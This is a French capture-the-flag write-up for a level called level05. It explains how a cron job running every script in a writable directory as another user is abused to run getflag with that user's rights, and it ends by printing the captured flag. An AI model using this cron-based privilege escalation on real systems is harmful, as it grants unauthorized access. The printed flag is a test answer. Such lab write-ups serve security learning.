## LEVEL05

- Dans ce level aucun fichier dans le home, on tente alors de trouver des fichiers contenant level05 :

```bash
find / -name "*level05*" 2>/dev/null
```

- On trouve :
```bash
/etc/apache2/sites-available/level05.conf
/etc/apache2/sites-enabled/level05.conf
/var/mail/level05
/rofs/etc/apache2/sites-available/level05.conf
/rofs/etc/apache2/sites-enabled/level05.conf
/rofs/var/mail/level05
```

- /var/mail/level05 semble intéressant, un cat dessus affiche : 
```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
- On comprend que flag05 a un crontab se lancant toutes les 2 minutes pour exécuter /usr/sbin/openarenaserver.  
Un cat sur ce script affiche :
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

- Ce script exécute chaque fichier présent dans /opt/openarenaserver via bash, avec les droits de flag05, puis le supprime.  
Comme level05 a les droits d’écriture dans ce dossier, il peut y déposer un script, on va donc pouvoir écrire un script dedans afin qu'il soit exécuté avec les droits de flag05.



## EXPLOITATION

- On ecrit donc un script dans /opt/openarenaserver qui va appeler getflag et envoyer la sortie dans un fichier qu' on pourra lire.  
Il faut donc aussi trouver un dossier où flag05 ait es droits d’écriture ET level05 les droits de lecture, par exemple /run/shm.  
```bash
printf '#!/bin/sh\n/bin/getflag > /run/shm/flag.txt\n' > script.sh
```
- Ensuite il suffit d'attendre l'execution via crontab et de lire le fichier dans /run/shm

## FLAG 

- viuaaale9huek52boumoomioc

